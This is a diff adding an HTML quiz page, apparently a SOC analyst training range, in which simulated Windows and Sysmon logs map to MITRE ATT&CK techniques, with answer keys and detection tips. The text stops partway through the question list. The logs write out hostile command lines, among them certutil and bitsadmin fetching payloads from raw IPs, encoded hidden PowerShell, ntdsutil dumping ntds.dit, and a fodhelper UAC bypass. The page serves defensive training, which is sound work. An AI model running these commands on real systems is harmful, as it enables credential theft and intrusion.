@@ -1,0 +1,1533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOC Analyst Training Range</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@400;500;600;700&display=swap');
+:root{--bg:#0a0e17;--surface:#111827;--surface2:#1a2236;--border:#1f2f4a;--accent:#00d4ff;--accent2:#7c3aed;--danger:#ef4444;--warn:#f59e0b;--success:#22c55e;--text:#e2e8f0;--muted:#64748b;--mono:'Share Tech Mono',monospace;--sans:'Inter',sans-serif;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);min-height:100vh;}
+header{background:linear-gradient(135deg,#0a0e17,#111827);border-bottom:1px solid var(--border);padding:0 2rem;position:sticky;top:0;z-index:100;display:flex;align-items:center;gap:2rem;height:60px;}
+.logo{font-family:var(--mono);color:var(--accent);font-size:1.1rem;letter-spacing:2px;white-space:nowrap;}
+.logo span{color:var(--muted);}
+nav{display:flex;gap:.5rem;flex:1;flex-wrap:wrap;}
+nav button{background:none;border:1px solid transparent;color:var(--muted);font-family:var(--sans);font-size:.75rem;padding:.4rem .9rem;border-radius:4px;cursor:pointer;text-transform:uppercase;letter-spacing:1px;transition:all .2s;}
+nav button.active,nav button:hover{border-color:var(--accent);color:var(--accent);}
+.score-badge{font-family:var(--mono);font-size:.8rem;color:var(--accent);background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.2);padding:.3rem .8rem;border-radius:20px;white-space:nowrap;}
+.main{display:flex;min-height:calc(100vh - 60px);}
+.sidebar{width:260px;min-width:260px;background:var(--surface);border-right:1px solid var(--border);padding:1.25rem .75rem;overflow-y:auto;max-height:calc(100vh - 60px);position:sticky;top:60px;}
+.content{flex:1;padding:2rem;overflow-y:auto;}
+.sidebar-label{font-size:.6rem;text-transform:uppercase;letter-spacing:2px;color:var(--muted);margin-bottom:.4rem;padding-left:.4rem;}
+.sidebar-section{margin-bottom:1.25rem;}
+.q-list{list-style:none;}
+.q-list li button{width:100%;text-align:left;background:none;border:none;color:var(--muted);font-size:.72rem;padding:.3rem .4rem;border-radius:4px;cursor:pointer;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;transition:all .15s;display:flex;align-items:center;gap:.4rem;}
+.q-list li button:hover{background:var(--surface2);color:var(--text);}
+.q-list li button.active{background:rgba(0,212,255,.1);color:var(--accent);}
+.q-list li button.answered{color:var(--success);}
+.q-list li button .dot{width:5px;height:5px;border-radius:50%;background:var(--border);flex-shrink:0;}
+.q-list li button.answered .dot{background:var(--success);}
+.q-list li button.active .dot{background:var(--accent);}
+.q-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:1.75rem;max-width:900px;}
+.q-meta{display:flex;gap:.5rem;align-items:center;margin-bottom:1rem;flex-wrap:wrap;}
+.tag{font-size:.62rem;text-transform:uppercase;letter-spacing:1px;padding:.2rem .55rem;border-radius:3px;font-weight:600;}
+.tag-mitre{background:rgba(124,58,237,.15);color:#a78bfa;border:1px solid rgba(124,58,237,.3);}
+.tag-host{background:rgba(34,197,94,.1);color:#4ade80;border:1px solid rgba(34,197,94,.2);}
+.tag-net{background:rgba(0,212,255,.08);color:var(--accent);border:1px solid rgba(0,212,255,.2);}
+.tag-triage{background:rgba(239,68,68,.1);color:#f87171;border:1px solid rgba(239,68,68,.2);}
+.q-num{font-family:var(--mono);font-size:.7rem;color:var(--muted);}
+.q-title{font-size:1.05rem;font-weight:600;line-height:1.5;margin-bottom:1.25rem;}
+.log-block{background:#070c14;border:1px solid var(--border);border-radius:6px;padding:1rem 1.25rem;margin-bottom:1.25rem;overflow-x:auto;}
+.log-block pre{font-family:var(--mono);font-size:.7rem;line-height:1.7;color:#94a3b8;white-space:pre;}
+.log-label{font-family:var(--mono);font-size:.58rem;text-transform:uppercase;letter-spacing:2px;color:var(--muted);margin-bottom:.5rem;display:flex;align-items:center;gap:.4rem;}
+.log-label::before{content:'';display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--accent);}
+.hl-red{color:#f87171;}.hl-yellow{color:#fbbf24;}.hl-green{color:#4ade80;}.hl-cyan{color:#67e8f9;}.hl-purple{color:#c4b5fd;}
+.options{display:flex;flex-direction:column;gap:.6rem;margin-bottom:1.25rem;}
+.option-btn{background:var(--surface2);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--sans);font-size:.85rem;padding:.75rem 1rem;text-align:left;cursor:pointer;transition:all .2s;display:flex;gap:.75rem;align-items:flex-start;}
+.option-btn:hover:not(:disabled){border-color:var(--accent);color:var(--accent);}
+.option-btn.correct{border-color:var(--success)!important;background:rgba(34,197,94,.1);color:var(--success)!important;}
+.option-btn.wrong{border-color:var(--danger)!important;background:rgba(239,68,68,.1);color:var(--danger)!important;}
+.option-btn:disabled{cursor:default;}
+.opt-letter{font-family:var(--mono);font-size:.72rem;color:var(--muted);flex-shrink:0;padding-top:1px;}
+.hint-row{display:flex;gap:.6rem;margin-bottom:.75rem;flex-wrap:wrap;}
+.hint-btn{background:none;border:1px solid var(--warn);color:var(--warn);font-family:var(--sans);font-size:.75rem;padding:.35rem .85rem;border-radius:4px;cursor:pointer;transition:all .2s;}
+.hint-btn:hover{background:rgba(245,158,11,.1);}
+.hint-btn:disabled{opacity:.4;cursor:default;}
+.hint-box{background:rgba(245,158,11,.06);border:1px solid rgba(245,158,11,.25);border-radius:6px;padding:.75rem 1rem;font-size:.8rem;color:#fcd34d;margin-bottom:.6rem;line-height:1.6;}
+.explain-box{background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.2);border-radius:6px;padding:1rem 1.25rem;margin-top:1rem;font-size:.82rem;line-height:1.7;color:#d1fae5;}
+.explain-box h4{color:var(--success);font-size:.75rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:.5rem;font-family:var(--mono);}
+.explain-box p{margin-bottom:.5rem;}.explain-box p:last-child{margin-bottom:0;}
+.q-nav{display:flex;gap:.75rem;margin-top:1.5rem;align-items:center;}
+.nav-btn{background:var(--surface2);border:1px solid var(--border);color:var(--text);font-family:var(--sans);font-size:.8rem;padding:.5rem 1.25rem;border-radius:4px;cursor:pointer;transition:all .2s;}
+.nav-btn:hover{border-color:var(--accent);color:var(--accent);}
+.nav-btn.primary{border-color:var(--accent);color:var(--accent);background:rgba(0,212,255,.08);}
+.progress-bar{height:3px;background:var(--border);border-radius:2px;margin-bottom:1.5rem;overflow:hidden;}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:2px;transition:width .4s;}
+.welcome{max-width:700px;margin:0 auto;padding:3rem 0;}
+.welcome h1{font-family:var(--mono);font-size:1.8rem;color:var(--accent);margin-bottom:.5rem;letter-spacing:2px;}
+.welcome p{color:var(--muted);font-size:.9rem;line-height:1.7;margin-bottom:1rem;}
+.stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;margin:2rem 0;}
+.stat-box{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:1.25rem;text-align:center;}
+.stat-box .num{font-family:var(--mono);font-size:1.8rem;color:var(--accent);display:block;}
+.stat-box .lbl{font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;}
+.start-btn{background:var(--accent);color:var(--bg);border:none;font-family:var(--sans);font-weight:700;font-size:.85rem;padding:.7rem 1.75rem;border-radius:6px;cursor:pointer;letter-spacing:1px;text-transform:uppercase;margin-right:.75rem;margin-bottom:.5rem;transition:opacity .2s;}
+.start-btn:hover{opacity:.85;}
+.hidden{display:none!important;}
+.scenario-banner{background:linear-gradient(135deg,rgba(239,68,68,.08),rgba(124,58,237,.08));border:1px solid rgba(239,68,68,.2);border-radius:6px;padding:1rem 1.25rem;margin-bottom:1.25rem;font-size:.85rem;line-height:1.7;}
+.scenario-banner strong{color:#f87171;}
+@media(max-width:768px){.sidebar{display:none;}.stat-grid{grid-template-columns:repeat(2,1fr);}}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">[ <span>SOC</span>HUNT ]</div>
+  <nav>
+    <button id="tab-home" class="active" onclick="showTab('home')">Overview</button>
+    <button id="tab-host" onclick="showTab('host')">Host Analysis</button>
+    <button id="tab-net" onclick="showTab('net')">Network Analysis</button>
+    <button id="tab-triage" onclick="showTab('triage')">Triage Scenarios</button>
+  </nav>
+  <div class="score-badge" id="score-display">Score: 0 / 0</div>
+</header>
+<div class="main">
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-section"><div class="sidebar-label">Host Analysis (1–25)</div><ul class="q-list" id="sidebar-host"></ul></div>
+    <div class="sidebar-section"><div class="sidebar-label">Network Analysis (26–50)</div><ul class="q-list" id="sidebar-net"></ul></div>
+    <div class="sidebar-section"><div class="sidebar-label">Triage Scenarios (T1–T50)</div><ul class="q-list" id="sidebar-triage"></ul></div>
+  </aside>
+  <main class="content">
+    <div id="view-home">
+      <div class="welcome">
+        <h1>DEFENSIVE ANALYST<br>TRAINING RANGE</h1>
+        <p>Built on the MITRE ATT&CK® framework. Practice real log analysis and triage with simulated Windows Event Logs, Sysmon, firewall logs, Splunk alerts, Linux logs, and more.</p>
+        <div class="stat-grid">
+          <div class="stat-box"><span class="num">25</span><span class="lbl">Host Analysis</span></div>
+          <div class="stat-box"><span class="num">25</span><span class="lbl">Network Analysis</span></div>
+          <div class="stat-box"><span class="num">50</span><span class="lbl">Triage Scenarios</span></div>
+          <div class="stat-box"><span class="num" id="home-score">0%</span><span class="lbl">Your Score</span></div>
+        </div>
+        <button class="start-btn" onclick="showTab('host')">Start Host Analysis</button>
+        <button class="start-btn" style="background:var(--accent2)" onclick="showTab('net')">Network Analysis</button>
+        <button class="start-btn" style="background:#ef4444" onclick="showTab('triage')">Triage Scenarios</button>
+      </div>
+    </div>
+    <div id="view-host" class="hidden"><div class="progress-bar"><div class="progress-fill" id="host-progress" style="width:0%"></div></div><div id="host-question-area"></div></div>
+    <div id="view-net" class="hidden"><div class="progress-bar"><div class="progress-fill" id="net-progress" style="width:0%"></div></div><div id="net-question-area"></div></div>
+    <div id="view-triage" class="hidden"><div class="progress-bar"><div class="progress-fill" id="triage-progress" style="width:0%"></div></div><div id="triage-question-area"></div></div>
+  </main>
+</div>
+<script>
+const hostQ=[
+{id:"H1",title:"Suspicious PowerShell Activity",mitre:"T1059.001",diff:"Medium",
+scenario:"Your EDR fires an alert on a workstation owned by a standard user. The process tree shows PowerShell launched from cmd.exe with several unusual flags. The user has no pending IT work and did not initiate this. What is happening?",
+log:`<span class="hl-cyan">[Sysmon EID 1 – Process Create]</span>
+Image:       powershell.exe
+CommandLine: powershell.exe <span class="hl-red">-NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0A...</span>
+ParentImage: C:\\Windows\\System32\\cmd.exe
+User:        CORP\\jsmith
+IntegrityLevel: High`,
+hint1:"MITRE ATT&CK: T1059.001 — Command and Scripting Interpreter: PowerShell",
+options:["A scheduled backup script running via PowerShell","Malicious encoded PowerShell execution — likely a reverse shell or C2 callback","PowerShell remoting session initiated by IT helpdesk","Windows Update running a background maintenance script"],
+correct:1,
+explain:`<h4>Explanation</h4><p>-NoP (No Profile), -NonI (Non-Interactive), and -W Hidden (Window Hidden) are the attacker triad for stealthy PS execution. The -Enc flag signals a Base64-encoded payload — decoded it reveals a TCP reverse shell connecting to an external IP. This pattern appears in Metasploit, Cobalt Strike, and Empire payloads.</p><p><strong>Hunt for:</strong> encoded PS commands, unusual parent/child process chains, outbound TCP from powershell.exe to unexpected IPs.</p>`},
+
+{id:"H2",title:"Unusual Process Memory Access",mitre:"T1003.001",diff:"Hard",
+scenario:"A binary you don't recognize is running from a temporary directory. Sysmon catches it opening a handle to a critical Windows system process with read permissions. Moments later, Security event logs record the same access. Should you be worried?",
+log:`<span class="hl-cyan">[Sysmon EID 10 – Process Access]</span>
+SourceImage:   C:\\Temp\\<span class="hl-red">svch0st.exe</span>
+TargetImage:   <span class="hl-red">C:\\Windows\\System32\\lsass.exe</span>
+GrantedAccess: <span class="hl-red">0x1010</span>
+
+<span class="hl-cyan">[Security EID 4656 – Handle to Object]</span>
+ObjectName:    lsass.exe
+AccessMask:    <span class="hl-red">0x1010</span>  (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)`,
+hint1:"MITRE ATT&CK: T1003.001 — OS Credential Dumping: LSASS Memory",
+options:["Antivirus performing a routine memory scan of LSASS","A masquerading binary reading LSASS memory to extract credential material","Windows Defender scanning active processes for malware","A backup service creating a system memory snapshot"],
+correct:1,
+explain:`<h4>Explanation</h4><p>LSASS holds NT hashes, Kerberos tickets, and plaintext credentials. Access mask 0x1010 (PROCESS_VM_READ + PROCESS_QUERY_INFORMATION) is the Mimikatz/ProcDump signature. svch0st.exe uses a zero instead of 'o' — classic masquerading. Legitimate system binaries never live in C:\\Temp.</p><p><strong>Detect:</strong> Sysmon EID 10 targeting lsass.exe from non-system paths, access mask 0x1010.</p>`},
+
+{id:"H3",title:"After-Hours Scheduled Task Creation",mitre:"T1053.005",diff:"Easy",
+scenario:"At 11:30 PM, a new scheduled task appears on a workstation. No IT change ticket exists for it. The task is named to look like a Windows system task, but something about its configuration is off. Is this legitimate or should you investigate?",
+log:`<span class="hl-cyan">[Security EID 4698 – Scheduled Task Created]</span>
+TaskName: <span class="hl-red">\\Microsoft\\Windows\\Defrag\\WindowsDefragService</span>
+Command:  <span class="hl-red">C:\\Users\\Public\\update.exe</span>
+Trigger:  <span class="hl-red">LogonTrigger</span> (runs on every logon)
+Creator:  CORP\\pjones`,
+hint1:"MITRE ATT&CK: T1053.005 — Scheduled Task/Job: Scheduled Task",
+options:["Windows scheduling automatic disk defragmentation","A persistence mechanism: fake system task executing a payload from a world-writable path on every logon","Admin deploying a software update via Group Policy","A legitimate Windows maintenance task created during OS installation"],
+correct:1,
+explain:`<h4>Explanation</h4><p>C:\\Users\\Public is world-writable — Windows services never run from there. The task path mimics a real Windows namespace to avoid suspicion. LogonTrigger means it runs every login. EID 4698 is your primary detection event for this technique.</p><p><strong>Hunt:</strong> 4698 events with executables in user-writable paths, logon triggers, Microsoft-namespace task names pointing to non-system binaries.</p>`},
+
+{id:"H4",title:"Registry Modification at Boot Key",mitre:"T1547.001",diff:"Easy",
+scenario:"Sysmon alerts on a registry write event during business hours. A process running from an unusual directory just modified a well-known Windows autostart key. The value name is designed to look harmless. What's the likely intent?",
+log:`<span class="hl-cyan">[Sysmon EID 13 – Registry Value Set]</span>
+Image:        <span class="hl-red">C:\\Windows\\Temp\\rat.exe</span>
+TargetObject: <span class="hl-red">HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate</span>
+Details:      <span class="hl-red">C:\\Windows\\Temp\\rat.exe --silent</span>`,
+hint1:"MITRE ATT&CK: T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys",
+options:["Windows Update registering its update agent service","Malware establishing persistence via a Run key disguised as a Windows component","Admin pushing a silent install via Group Policy registry preferences","A Sysmon false positive from a Windows maintenance task"],
+correct:1,
+explain:`<h4>Explanation</h4><p>HKLM\\...\\Run executes every value at boot/logon. rat.exe from C:\\Windows\\Temp is never a legitimate Windows binary. The value name 'WindowsUpdate' is spoofed to evade casual review. Sysmon EID 13 captures this at the moment of write — before the next reboot even occurs.</p><p><strong>Hunt:</strong> Sysmon EID 13 writes to Run/RunOnce keys where values point to Temp, Users, or Public paths.</p>`},
+
+{id:"H5",title:"3AM Network Logon — Privileged Account",mitre:"T1550.002",diff:"Hard",
+scenario:"At 3AM, your SIEM alerts on a successful network logon to a server using the built-in administrator account. No admin is on call tonight. The source workstation isn't typically used for admin tasks, and notably — no explicit credential logon event exists on the source machine. What do you make of this?",
+log:`<span class="hl-cyan">[Security EID 4624 – Logon]</span>
+LogonType:    <span class="hl-red">3</span> (Network)
+AuthPackage:  <span class="hl-red">NTLM</span>
+TargetUser:   administrator
+IpAddress:    <span class="hl-red">10.0.0.52</span>
+
+<span class="hl-cyan">[Security EID 4776 – NTLM Auth]</span>
+TargetUser:   administrator
+ErrorCode:    <span class="hl-green">0x0</span> (Success)
+
+<span class="hl-yellow">NOTE: No corresponding EID 4648 on source machine 10.0.0.52</span>`,
+hint1:"MITRE ATT&CK: T1550.002 — Use Alternate Authentication Material: Pass the Hash",
+options:["Admin performing routine remote maintenance from a workstation","A stolen NTLM hash used to authenticate as administrator without knowing the password","Domain controller performing a health check","WinRM session from the helpdesk team"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Pass-the-Hash exploits NTLM by replaying a captured hash — no plaintext password needed. Key indicators: NTLM auth (not Kerberos), LogonType 3, privileged account, unusual hours, and critically — no EID 4648 (explicit credential logon) on the source host. Tools: Mimikatz, Impacket, CrackMapExec.</p><p><strong>Detect:</strong> Correlate EID 4624 (LogonType 3, NTLM) + 4776 without a matching 4648 on the source machine.</p>`},
+
+{id:"H6",title:"Signed App, Suspicious Library",mitre:"T1574.002",diff:"Hard",
+scenario:"A legitimate, well-known media player application is running — but from a non-standard directory. Sysmon shows it loading a supporting DLL that fails signature validation and has a hash mismatch against known-good versions. The DLL name is correct but something about it isn't right. What technique are you looking at?",
+log:`<span class="hl-cyan">[Sysmon EID 7 – Image Loaded]</span>
+Image:       C:\\Users\\Public\\Games\\<span class="hl-red">VLC.exe</span>
+ImageLoaded: C:\\Users\\Public\\Games\\<span class="hl-red">libvlc.dll</span>
+Signed:      <span class="hl-red">false</span>
+SHA256:      <span class="hl-red">a1b2c3d4...</span> (mismatch vs known-good hash)
+
+<span class="hl-cyan">[VirusTotal]</span>
+libvlc.dll: <span class="hl-red">34/72 engines flagged</span>`,
+hint1:"MITRE ATT&CK: T1574.002 — Hijack Execution Flow: DLL Side-Loading",
+options:["A user playing a game that uses VLC libraries","A malicious DLL planted next to a legitimate app to execute code inside a trusted process","Windows Media Player loading a codec plugin","VLC updating its DLL libraries from the internet"],
+correct:1,
+explain:`<h4>Explanation</h4><p>DLL side-loading abuses Windows' DLL search order. A trusted, signed app is placed in an attacker-controlled directory next to a malicious DLL with the expected filename. Windows loads the malicious DLL because it finds it first — before searching System32. The attacker's code runs inside a trusted process, evading many controls.</p><p><strong>Hunt:</strong> Sysmon EID 7 with Signed=false for DLLs loaded by signed applications outside standard install paths.</p>`},
+
+{id:"H7",title:"Elevation Without a UAC Prompt",mitre:"T1548.002",diff:"Medium",
+scenario:"A user on a standard workstation did not see any UAC prompt today — but your logs show a process escalated from medium to high integrity. Digging into the registry timeline, you find a specific key was written moments before the elevation. No admin password was entered. How did this happen?",
+log:`<span class="hl-cyan">[Sysmon EID 13 – Registry Write]</span>
+Image:        C:\\Users\\jdoe\\AppData\\Local\\Temp\\<span class="hl-red">dropper.exe</span>
+TargetObject: <span class="hl-red">HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command</span>
+Details:      <span class="hl-red">C:\\Windows\\Temp\\payload.exe</span>
+
+<span class="hl-cyan">[Sysmon EID 1 – Process Create]</span>
+ParentImage:    C:\\Temp\\dropper.exe
+Image:          C:\\Windows\\System32\\<span class="hl-cyan">fodhelper.exe</span>
+IntegrityLevel: <span class="hl-red">High</span>`,
+hint1:"MITRE ATT&CK: T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control",
+options:["A user accepting a UAC prompt to install software","Windows Feature On Demand helper performing a system update","A UAC bypass technique escalating a payload to High integrity with no user prompt","Group Policy pushing an update at logon"],
+correct:2,
+explain:`<h4>Explanation</h4><p>The fodhelper UAC bypass: a medium-integrity process writes to HKCU ms-settings open command, then launches fodhelper.exe — which auto-elevates without a UAC prompt and executes the registered command at High integrity. No admin password, no dialog box, no user awareness.</p><p><strong>Detect:</strong> Sysmon EID 13 writes to the ms-settings key, fodhelper spawned from a non-system parent, integrity level elevation without a corresponding EID 4703.</p>`},
+
+{id:"H8",title:"Persistence Hidden in WMI",mitre:"T1546.003",diff:"Hard",
+scenario:"During a threat hunt you check WMI subscriptions and find a Filter, Consumer, and Binding that shouldn't be there. The consumer runs an encoded PowerShell command. The trigger waits 4 minutes after system boot before firing. No scheduled task, no Run key — yet this survives every reboot. What are you dealing with?",
+log:`<span class="hl-cyan">[Sysmon EID 19 – WMI Event Filter]</span>
+Name:  <span class="hl-red">SCM Event Log Filter</span>
+Query: SELECT * FROM __InstanceModificationEvent WITHIN 60
+       WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
+       AND TargetInstance.SystemUpTime >= 240
+
+<span class="hl-cyan">[Sysmon EID 20 – WMI Consumer]</span>
+Name:     <span class="hl-red">SCM Event Log Consumer</span>
+Template: <span class="hl-red">powershell.exe -NoP -W Hidden -Enc JABjAG...</span>
+
+<span class="hl-cyan">[Sysmon EID 21 – WMI Binding]</span>
+Consumer: SCM Event Log Consumer`,
+hint1:"MITRE ATT&CK: T1546.003 — Event Triggered Execution: Windows Management Instrumentation Event Subscription",
+options:["Windows Service Control Manager logging health events","A fileless persistence mechanism triggered by WMI after every boot — invisible to standard startup audits","A monitoring agent using WMI to check system uptime","Windows Defender using WMI for real-time scanning"],
+correct:1,
+explain:`<h4>Explanation</h4><p>WMI subscriptions (Filter + Consumer + Binding) survive reboots and live in the WMI repository — not the file system or registry. The 240-second delay evades sandboxes that terminate analysis within 2 minutes. Sysmon EIDs 19/20/21 are your primary detection — most SIEM deployments miss this entirely.</p><p><strong>Hunt:</strong> Sysmon EIDs 19-21, any CommandLineTemplate containing PowerShell or encoded commands.</p>`},
+
+{id:"H9",title:"Kerberos Traffic Anomaly",mitre:"T1558.003",diff:"Hard",
+scenario:"Your domain controller logs show an explosion of Kerberos service ticket requests from a single user account — dozens of different services in under two minutes. The encryption type requested is notably weaker than your policy enforces. This user normally requests a handful of tickets per day. What is this pattern associated with?",
+log:`<span class="hl-cyan">[Security EID 4769 – Kerberos Service Ticket]</span>
+AccountName:      jsmith@CORP.LOCAL
+ServiceName:      MSSQLSvc/dbserver01.corp.local:1433
+TicketEncType:    <span class="hl-red">0x17</span> (RC4-HMAC)
+
+<span class="hl-yellow">Repeated for 12 more SPNs within 90 seconds:</span>
+  HTTP/webserver01, CIFS/fileserver02, LDAP/dc01...
+Total: <span class="hl-red">13 service tickets in 90 seconds</span>`,
+hint1:"MITRE ATT&CK: T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting",
+options:["A user accessing multiple file shares for work","Bulk service ticket requests using weak encryption — targeting service account password hashes for offline cracking","Domain controller replicating service account data","Kerberos performing ticket renewal for an SSO session"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Kerberoasting requests RC4 (0x17) tickets because they're weaker and faster to crack offline than AES. 13 SPN requests in 90 seconds from one non-service account is automation — not a user clicking around. The tickets are taken offline and cracked with Hashcat. Tools: Rubeus, Impacket GetUserSPNs.</p><p><strong>Detect:</strong> EID 4769 with EncType=0x17, high SPN request rate from non-service accounts.</p>`},
+
+{id:"H10",title:"Native Tool Used for Download",mitre:"T1105",diff:"Medium",
+scenario:"A standard Windows utility normally associated with certificate management just made an outbound HTTP connection to a raw IP address and wrote a file to a temp directory. No certificate operation was in progress. How is this tool being abused, and what does it tell you about the attacker's approach?",
+log:`<span class="hl-cyan">[Sysmon EID 1 – Process Create]</span>
+Image:       C:\\Windows\\System32\\<span class="hl-cyan">certutil.exe</span>
+CommandLine: certutil.exe <span class="hl-red">-urlcache -split -f</span> http://198.51.100.42/shell.exe C:\\Temp\\shell.exe
+User:        CORP\\bwilson
+ParentImage: C:\\Windows\\System32\\cmd.exe
+
+<span class="hl-cyan">[Sysmon EID 22 – DNS Query]</span>
+QueryName:   <span class="hl-red">198.51.100.42</span> (raw IP — no DNS lookup)`,
+hint1:"MITRE ATT&CK: T1105 — Ingress Tool Transfer (via Living-off-the-Land Binary)",
+options:["certutil validating an SSL certificate from an internal CA","A built-in Windows tool abused to download a remote payload — no third-party software required","Windows downloading a certificate revocation list","Admin exporting a code-signing certificate for deployment"],
+correct:1,
+explain:`<h4>Explanation</h4><p>certutil -urlcache -split -f [URL] [output] is a native Windows downloader — no curl, wget, or PowerShell needed. Using a raw IP bypasses DNS-based threat intel. Output to C:\\Temp is an IOC. This is classic Living-off-the-Land (LotL) — abusing trusted binaries to avoid security tool alerts.</p><p><strong>Hunt:</strong> certutil.exe with -urlcache, outbound connections from certutil, files created in Temp following certutil execution.</p>`},
+
+{id:"H11",title:"New Service — Wrong Location",mitre:"T1543.003",diff:"Medium",
+scenario:"Windows System Event logs record a new service being installed outside of business hours. The service name mimics a legitimate Windows audio component, but when you check the binary path, something immediately stands out. The service runs as LocalSystem and starts automatically. Legitimate?",
+log:`<span class="hl-cyan">[System EID 7045 – New Service]</span>
+ServiceName:    <span class="hl-red">WindowsAudioSvc</span>
+BinaryPath:     <span class="hl-red">C:\\Windows\\Temp\\svchost32.exe -k netsvcs</span>
+StartType:      Auto Start
+ServiceAccount: LocalSystem
+
+<span class="hl-cyan">[Security EID 4697 – Service Installed]</span>
+ServiceFileName: <span class="hl-red">C:\\Windows\\Temp\\svchost32.exe</span>`,
+hint1:"MITRE ATT&CK: T1543.003 — Create or Modify System Process: Windows Service",
+options:["Windows Audio Service registering after a driver update","A malicious service installed for persistence, masquerading as a Windows audio component","IT deploying a remote management agent via SCCM","Legitimate audio enhancement service from a third-party application"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Legitimate Windows services never run from C:\\Windows\\Temp. svchost32.exe mimics svchost.exe with an appended '32'. Auto-start as LocalSystem provides SYSTEM-level persistent execution without any user interaction. EIDs 7045 and 4697 should be alerting whenever binary paths are outside of system directories.</p><p><strong>Detect:</strong> New services with binaries outside of System32/SysWOW64, service names spoofing known Windows services.</p>`},
+
+{id:"H12",title:"Domain Database Export on DC",mitre:"T1003.003",diff:"Hard",
+scenario:"A monitoring alert fires on your Primary Domain Controller: a service account used for Nagios checks just ran a command-line tool associated with Active Directory maintenance. Shortly after, a large archive file appears in a temp directory on the same DC. No change ticket exists for this work. What should be your immediate concern?",
+log:`<span class="hl-cyan">[Sysmon EID 1 – ntdsutil]</span>
+Image:       C:\\Windows\\System32\\<span class="hl-cyan">ntdsutil.exe</span>
+CommandLine: ntdsutil.exe "ac i ntds" "ifm" <span class="hl-red">"create full C:\\Temp\\ntds_bak"</span> q q
+User:        CORP\\svc_monitoring
+
+<span class="hl-cyan">[Sysmon EID 11 – File Create]</span>
+TargetFilename: <span class="hl-red">C:\\Temp\\ntds_bak\\Active Directory\\ntds.dit</span>
+TargetFilename: <span class="hl-red">C:\\Temp\\ntds_bak\\registry\\SYSTEM</span>
+
+<span class="hl-cyan">[Sysmon EID 1 – rar.exe]</span>
+CommandLine: rar.exe a -hp<span class="hl-red">P@ss123</span> C:\\Temp\\backup.rar C:\\Temp\\ntds_bak\\`,
+hint1:"MITRE ATT&CK: T1003.003 — OS Credential Dumping: NTDS",
+options:["An automated AD health check creating a routine database export","Domain credential theft: ntds.dit exported for offline hash extraction, then staged for exfiltration","Windows Server Backup creating a scheduled AD backup","DC replication syncing the domain database to a secondary DC"],
+correct:1,
+explain:`<h4>Explanation</h4><p>ntds.dit + SYSTEM hive = all domain password hashes extractable offline with secretsdump.py — no further DC access required. The IFM (Install From Media) feature is designed for DC promotion, not backups. The password-protected RAR is exfiltration staging. Treat this as a full domain credential compromise.</p><p><strong>MITRE:</strong> T1003.003, T1560.001. Detect: ntdsutil IFM commands, ntds.dit created outside the NTDS directory, compression of AD files.</p>`},
+
+{id:"H13",title:"Background Transfer Service Abuse",mitre:"T1197",diff:"Medium",
+scenario:"You're reviewing proxy logs and notice a Windows background transfer service making an outbound HTTP connection to an unknown external IP, downloading a file to a world-writable directory. No Windows Update is scheduled. The job name looks innocuous. What technique allows an attacker to blend into legitimate OS traffic this way?",
+log:`<span class="hl-cyan">[Sysmon EID 1 – bitsadmin]</span>
+Image:       C:\\Windows\\System32\\<span class="hl-cyan">bitsadmin.exe</span>
+CommandLine: bitsadmin /transfer <span class="hl-red">UpdateJob</span> /download /priority HIGH
+             http://203.0.113.77/stage2.exe C:\\Users\\Public\\svcupd.exe
+
+<span class="hl-cyan">[BITS Application Event]</span>
+JobName:   <span class="hl-red">UpdateJob</span>
+RemoteUrl: <span class="hl-red">http://203.0.113.77/stage2.exe</span>
+LocalFile: C:\\Users\\Public\\svcupd.exe
+Bytes:     163840`,
+hint1:"MITRE ATT&CK: T1197 — BITS Jobs",
+options:["Windows Update downloading a security patch in the background","BITS abused as a Living-off-the-Land binary to download a second-stage payload from an external server","Software deployment using BITS for bandwidth-efficient delivery","OneDrive syncing files using the BITS infrastructure"],
+correct:1,
+explain:`<h4>Explanation</h4><p>BITS jobs run inside the signed Windows BITS service (svchost), survive reboots, run in the background, and can download from any URL. Traffic can be mistaken for Windows Update. C:\\Users\\Public and an external IP are the IOCs here — legitimate OS update jobs use Microsoft domains.</p><p><strong>Hunt:</strong> bitsadmin with external URLs, BITS Application log, network connections from svchost.exe (hosting BITS) to non-Microsoft IPs.</p>`},
+
+{id:"H14",title:"File With Suspicious Timestamp",mitre:"T1070.006",diff:"Medium",
+scenario:"During forensic analysis of a compromised host, Sysmon logs reveal a file in a temp directory whose creation timestamp was modified after it was written. The new timestamp predates the current OS installation by years. Why would an attacker do this, and what does it mean for your timeline analysis?",
+log:`<span class="hl-cyan">[Sysmon EID 2 – File Creation Time Changed]</span>
+Image:                    <span class="hl-red">C:\\Windows\\Temp\\implant.exe</span>
+TargetFilename:           C:\\Windows\\Temp\\implant.exe
+CreationUtcTime:          <span class="hl-red">2019-07-15 08:00:00</span>
+PreviousCreationUtcTime:  2024-11-14 04:51:09`,
+hint1:"MITRE ATT&CK: T1070.006 — Indicator Removal: Timestomp",
